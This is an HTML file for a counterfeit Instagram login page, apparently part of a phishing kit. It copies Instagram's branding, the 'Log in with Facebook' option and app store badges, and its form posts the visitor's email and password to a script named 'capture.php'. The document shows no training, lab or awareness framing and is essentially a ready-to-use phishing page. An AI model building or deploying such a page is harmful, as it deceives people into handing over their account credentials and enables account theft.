
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <div class="container">
        <h1>Instagram</h1>
        <form action="./capture.php" method="POST">
        <label for="email">Email or mobile phone number</label>
        <input type="email" id="email" name="email" required>
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="divider">
            <span>OR</span>
        </div>
        <div class="alternative-login">Log in with Facebook</div>
        <div class="forgot-password">Forgot password?</div>
        <div class="signup-link">
            Don't have an account? <span class="alternative-login">Sign up</span>
        </div>
        <div class="get-the-app">Get the app.</div>
        <div class="app-buttons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Download_on_the_Microsoft_Store_badge.svg" alt="Get it from Microsoft">
        </div>
    </div>
</body>
</html>
